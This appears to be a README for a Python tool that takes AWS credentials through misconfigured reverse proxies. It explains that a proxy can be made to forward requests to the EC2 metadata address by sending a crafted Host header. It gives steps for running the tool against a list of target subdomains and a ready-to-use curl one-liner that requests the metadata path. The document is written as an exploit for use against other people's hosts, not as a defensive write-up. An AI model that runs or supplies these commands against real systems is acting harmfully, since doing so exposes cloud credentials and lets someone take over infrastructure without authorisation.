### What is this?
The set `proxy_server` and `proxy_pass` directives are typically used in the configuration file of a web server like Apache or Nginx running on an Amazon EC2 instance to configure a proxy server that will forward incoming requests to another server.


#### Misconfiguration:
Sometimes people set http://aws.ca.fi (which resolves to `169.254.169.254`) as proxy server that will receive incoming requests.

### Exploit
So we can modify the proxy by passing aws metadata url to the header and get aws-credentials. Most common header is `Host` header but you can brute-force with other headers to find out(modify the script accordingly).


### How to run?
- Pass a file(full path) with target subdomains
    - file format without http or https protocol: \
    `line 1: stage.abc.com` \ 
    `line 2: beta-stage.abc.com`
- Run: `python aws-credentials-via-proxy.py C:\Users\Nitin\Documents\github\subdomains.txt`

If you have fewer or one target, run - `curl -ik -H "Host:aws.ca.fi" http://target.com/latest/meta-data/`
